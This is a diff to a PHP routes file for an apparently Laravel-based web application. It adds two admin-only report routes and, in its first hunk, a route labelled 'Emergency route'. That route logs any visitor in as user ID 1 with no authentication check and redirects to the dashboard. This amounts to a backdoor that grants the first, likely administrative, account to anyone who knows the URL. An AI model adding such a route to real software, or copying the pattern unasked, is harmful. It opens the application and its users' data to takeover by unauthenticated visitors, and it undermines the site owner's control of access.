@@ -15,7 +15,11 @@ Route::when('*', 'csrf', array('post'));
 Route::get('login',['as' => 'login', 'uses' =>'SessionsController@create']);
 Route::get('logout',['as'=>'logout', 'uses' =>'SessionsController@destroy']);
 Route::resource('sessions', 'SessionsController',['only' => ['create','store','destroy']]);
-
+//Emergency route
+Route::get('/emergency', function(){
+	Auth::login(User::find(1));
+	return Redirect::to('/dashboard');
+});
 Route::get('/', ['as'=>'home', function(){
 	return Redirect::to('/dashboard');
 }])->before('auth');
@@ -210,6 +214,8 @@ Route::group(["before" => "admin", 'prefix' => 'user/{user}'], function() {
 	Route::resource('/additional-reports', 'AdditionalReportsController');
 	Route::post('/get-monthly-sales-report', 'AdditionalReportsController@getMonthlySalesReport');
 	Route::post('/get-monthly-collection-report', 'AdditionalReportsController@getMonthlyCollectionReport');
+	Route::post('/get-bad-accounts', 'AdditionalReportsController@getBadAccounts');
+	Route::post('/get-receivable-report', 'AdditionalReportsController@getReceivables');
 });
 
 
